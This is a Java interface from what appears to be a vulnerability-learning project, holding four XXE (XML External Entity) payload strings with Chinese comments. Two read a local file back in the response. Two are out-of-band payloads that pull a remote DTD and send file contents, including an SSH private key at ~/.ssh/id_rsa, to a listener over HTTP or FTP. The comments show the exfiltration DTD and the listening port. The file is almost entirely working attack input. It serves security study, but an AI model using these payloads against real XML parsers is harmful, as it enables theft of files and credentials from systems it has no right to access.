package com.r17a.commonvuln.securitymissconfig.xxe;

/**
 * from https://github.com/threedr3am/learnjavabug/tree/master/xxe/src/main/java/com/threedr3am/bug/xxe
 */
public interface Payloads {

    /**
     * 有回显的payload xml
     * <p>
     * 读取文件内容
     */
    String FEEDBACK =
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    + "<!DOCTYPE root ["
                    + "        <!ENTITY xxe SYSTEM \"file:///E://111.txt\">"
                    + "        ]>"
                    + "<root>&xxe;</root>";

    /**
     * 有回显的payload xml，带了xsl
     * <p>
     * 读取文件内容
     */
    String FEEDBACK_XSL =
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                    "<!DOCTYPE xxe [\n" +
                    "<!ENTITY file SYSTEM \"file:///E://111.txt\" >\n" +
                    "]>\n" +
                    "<?xml-stylesheet type=\"text/xsl\" href=\"E://222.xsl\"?>\n" +
                    "<catalog>\n" +
                    "    <test>&file;</test>\n" +
                    "</catalog>";

    /**
     * 没有回显，只能带出去的payload xml，读取文件单行
     * <p>
     * 读取/tmp/aaa文件内容
     * 127.0.0.1:80的http web服务器存放xxe.dtd文件：
     * <!ENTITY % all "<!ENTITY send SYSTEM 'http://127.0.0.1:23232?file=%file;' >">
     * 监听23232端口
     */
    String NO_FEEDBACK_SINGLE_LINE =
            "<?xml version=\"1.0\" ?>"
                    + "<!DOCTYPE note ["
                    + "   <!ENTITY % file SYSTEM \"file:///E://111.txt\">"
                    + "   <!ENTITY % remote SYSTEM \"http://127.0.0.1:8888/xxe.dtd\">"
                    + "   %remote;%all;"
                    + "]>"
                    + "<root>&send;</root>";

    /**
     * 没有回显，只能带出去的payload xml，读取文件多行
     * <p>
     * 读取/tmp/aaa文件内容
     * 127.0.0.1:80的http web服务器存放xxe.dtd文件：
     * <!ENTITY % all "<!ENTITY send SYSTEM 'ftp://127.0.0.1:23232?file=%file;' >">
     * 监听23232端口
     */
    String NO_FEEDBACK_MULT_LINE =
            "<?xml version=\"1.0\" ?>"
                    + "<!DOCTYPE note ["
                    + "   <!ENTITY % file SYSTEM \"file:///Users/xuanyh/.ssh/id_rsa\">"
                    + "   <!ENTITY % remote SYSTEM \"http://127.0.0.1:80/xxe_mult.dtd\">"
                    + "   %remote;%all;"
                    + "]>"
                    + "<root>&send;</root>";
}
